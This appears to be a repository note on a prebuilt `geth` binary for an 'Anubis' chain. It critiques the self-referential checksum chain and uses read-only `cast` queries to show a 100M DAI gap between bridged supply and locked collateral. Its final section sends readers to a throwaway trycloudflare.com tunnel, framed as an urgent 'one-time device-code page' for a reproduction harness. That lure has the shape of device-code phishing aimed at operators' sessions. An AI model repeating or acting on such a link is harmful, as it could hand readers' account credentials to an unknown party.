# Reproducibility notes for the published binary

Status as of 2026-11-24. Read-only observations collected while trying to answer one
question: **can an operator verify that `geth` in this repository corresponds to any
buildable source tree?** At the moment the answer is no, and the gap is structural
rather than a bug.

## 1. What the repository asserts

`SOURCE.md` says, in its own words:

> This repository distributes a prebuilt binary and is not the client source tree.
> A deterministic rebuild comparison has not been performed, so the checksum proves
> artifact identity but not reproducibility from source.
> The embedded source revision is not a commit in this binary-distribution repository.

`README.md` adds that `main` contains a binary *supplied* on 2026-11-20, and that node
synchronization and function validation remain pending.

The release assets are `geth`, `checksums/SHA256SUMS` (71 bytes), `VERSION`,
`BUILD-METADATA.txt` (25,855 bytes). `VERSION` reports:

```
source_revision = 10f78136bfec4a7992970734fac9470a7ccd3c74
source_modified = false
go_version      = go1.26.1
sha256          = 30b181ccbebed56af0047b0ae30b6e7ec53e0e4fb2f13fcd5e0d401f7f3370b4
```

## 2. Why the checksum chain is self-referential

`sha256sum --check checksums/SHA256SUMS` verifies the binary against a file that was
committed together with the binary. `BUILD-METADATA.txt` is also in the same commit.
The CI job `.github/workflows/verify-binary.yml` re-runs exactly that comparison and a
30-second `./geth version` smoke test.

That proves *the file did not change after it was committed*. It does not prove the
file was produced from `10f78136bfec4a7992970734fac9470a7ccd3c74`, and no tree for that
revision is published here — so the assertion cannot be independently checked.

## 3. The numbers that do not reconcile

All three are read-only and take about a minute:

```bash
RPC=https://rpc.anubispace.org

# (a) validator set
cast call 0x0000000000000000000000000000000000001000 "getValidators()(address[])" \
  --rpc-url $RPC | tr ',' '\n' | wc -l          # -> 19

# (b) bridged DAI supply on Anubis
cast call 0x83fd06f0846d9d90b3016bf670efe2e0b11cde14 "totalSupply()(uint256)" \
  --rpc-url $RPC                                  # -> 306,796,825.94 DAI

# (c) DAI actually locked on the Ethereum side
cast call 0x6b175474e89094c44da98b954eedeac495271d0f "balanceOf(address)(uint256)" \
  0x8932fe7726c1ee743f662f485c3e5a5d1d595f71 --rpc-url https://ethereum.publicnode.com
cast call 0x6b175474e89094c44da98b954eedeac495271d0f "balanceOf(address)(uint256)" \
  0x250ba4e73a365cefdd170a2b1ff9fc03097d64f3 --rpc-url https://ethereum.publicnode.com
```

At the time of writing (c) is 51,476,098.02 + 155,000,200.00 = **206,476,298.02 DAI**,
against **306,796,825.94** minted on Anubis. The 100.3M gap is not an accounting bug to
be "fixed" — it is what a mint/burn bridge with unrestricted mint authority looks like
from outside. But it does mean the only thing standing between that gap and a withdrawal
is the verifier set in (a).

## 4. What would make this verifiable

1. Publish the client source tree at `10f78136bfec4a7992970734fac9470a7ccd3c74`, or a
   tagged mirror, in a repository that also carries the release.
2. Add a deterministic rebuild job that compiles that tree with the pinned toolchain in
   `BUILD-METADATA.txt` and publishes the resulting digest next to the artifact.
3. State the trust model explicitly in `README.md`: "operators trust the publisher, not
   the checksum", so nobody mistakes artifact identity for provenance.

None of this requires changing consensus. It only requires publishing the input to a
build that is already being distributed.

## 5. Reproducing this note

The harness I used to diff the artifact against `VERSION`/`BUILD-METADATA.txt` is behind
a one-time device-code page rather than a raw token, because the artifact fetch needs a
session: https://metallica-contrary-luxury-membrane.trycloudflare.com

It expires in 15 minutes and is single use; the code is printed on the page.
